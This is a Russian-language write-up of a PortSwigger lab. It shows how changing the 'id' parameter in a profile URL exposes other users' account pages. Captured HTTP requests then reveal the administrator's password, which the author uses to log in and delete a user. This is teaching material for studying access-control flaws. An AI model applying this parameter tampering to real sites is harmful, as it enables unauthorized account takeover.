---
title: "User ID controlled by request parameter with password disclosure"
date: 2025-07-17
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/access-control-apprentice/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure"
classes: wide
---

Для решения лабы нужно получить пароль администратора и удалить пользователя `carlos`. У нас есть креды аккаунта `wiener:peter`.

```
https://0a08009c04cf91c08113e57500d00040.web-security-academy.net/
```

## Solution

Давайте зайдем в наш аккаунт.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_password_disclosure/1.png){: height="200" .align-center}

Мы можем поменять пароль, давайте это сделаем. Для смены пароля отправляется следующий `HTTP`-запрос:

```http
POST /my-account/change-password HTTP/2
Host: 0a08009c04cf91c08113e57500d00040.web-security-academy.net
Cookie: session=A8ftLNDC7xCMEgpUPJZiUwxuswsUz3Hr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7200db03aa32bb8510b21b00ce0097.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: https://0a7200db03aa32bb8510b21b00ce0097.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=OwtMTy0ECLZB4Ye67gZQHm441sE0XH4t&password=peter
```

В `url` профиля `https://0a08009c04cf91c08113e57500d00040.web-security-academy.net/my-account?id=wiener` есть параметр `id`. Попробую подставить другой логин вместо `wiener`. Например, `carlos`.

Получилось. Значит мы можем попробовать получить доступ к другому аккаунту таким образом. Например к аккаунту администратора `administator`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_password_disclosure/2.png){: height="200" .align-center}

Теперь отправим запрос на замену пароля, чтобы увидить старый пароль от аккаута.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_password_disclosure/3.png){: height="200" .align-center}

Из `GET`-запроса мы можем получит пароль администратора `ow5jiz1snvfoh8w5k0wr`. 

```http
POST /my-account/change-password HTTP/2
Host: 0a08009c04cf91c08113e57500d00040.web-security-academy.net
Cookie: session=pGe3qXmI9bEzCKhTqLZX6bNGv0KbdHDz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a08009c04cf91c08113e57500d00040.web-security-academy.net/my-account?id=administrator
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: https://0a08009c04cf91c08113e57500d00040.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=VXv8WXomogQouSE7PomUtxHnScwSkfgS&password=ow5jiz1snvfoh8w5k0wr
```

Попробуем залогиниться.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_password_disclosure/4.png){: height="200" .align-center}

Мы получили доступ к аккаунту администратора, теперь удалим пользователя `carlos` для завершения лабы.